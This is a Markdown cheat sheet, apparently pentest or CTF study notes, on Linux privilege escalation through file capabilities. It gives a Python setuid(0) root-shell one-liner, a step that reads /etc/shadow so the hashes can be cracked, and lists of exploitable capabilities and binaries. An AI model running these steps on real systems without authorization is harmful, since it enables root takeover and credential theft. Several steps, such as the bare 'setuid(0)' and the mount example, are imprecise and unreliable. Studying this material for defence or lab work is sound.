# Linux Privilege Escalation – Capabilities

## Purpose

This file provides a structured workflow for identifying and exploiting Linux file capabilities for privilege escalation.

Core rules:

* Capabilities can grant root-level actions without SUID
* Often overlooked during enumeration
* Some capabilities = instant root

---

## 0. What Are Capabilities?

Linux capabilities allow binaries to perform privileged operations without full root privileges.

Example:

* CAP_SETUID → allows setting UID (can become root)

---

## 1. Find Capabilities (CRITICAL FIRST STEP)

```bash
getcap -r / 2>/dev/null
```

---

## 2. High-Risk Capabilities

Look for:

* cap_setuid
* cap_setgid
* cap_dac_read_search
* cap_dac_override
* cap_sys_admin

---

## 3. CAP_SETUID (HIGH VALUE)

If binary has:

```text
cap_setuid+ep
```

Exploit:

```bash
./binary
```

Then:

```bash
setuid(0)
```

Or use Python:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 4. Python with Capabilities

If python has cap_setuid:

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

→ root shell

---

## 5. CAP_DAC_OVERRIDE / READ_SEARCH

Allows bypassing file permissions.

Use to read:

* /etc/shadow
* root-only files

```bash
cat /etc/shadow
```

Then crack hashes.

---

## 6. CAP_SYS_ADMIN (CRITICAL)

Very powerful capability.

Possible actions:

* mount filesystems
* manipulate system settings

Example:

```bash
mount -o bind /bin/bash /tmp/bash
```

---

## 7. CAP_SETGID

Allows changing group IDs.

Can be used with:

* privileged groups
* file access

---

## 8. Exploiting Custom Binaries

If custom binary has capabilities:

* run it
* inspect functionality
* attempt command execution

---

## 9. Combine with GTFOBins

Search:

```bash
https://gtfobins.github.io/
```

Check:

* capability abuse methods

---

## 10. Common Exploitable Binaries

Look for capabilities on:

* python
* perl
* bash
* tar
* find

---

## 11. If Binary Allows Execution

Try:

```bash
./binary /bin/bash
```

---

## 12. If Stuck

RESET:

* re-run getcap
* check each binary manually
* test execution paths
* combine with GTFOBins

---

## 13. Mental Model

* Capabilities = hidden privileges
* Certain caps = root actions
* Execution = escalation

---

## 14. Golden Rules

* Always run getcap early
* Focus on cap_setuid first
* Test binaries immediately
* Combine with GTFOBins
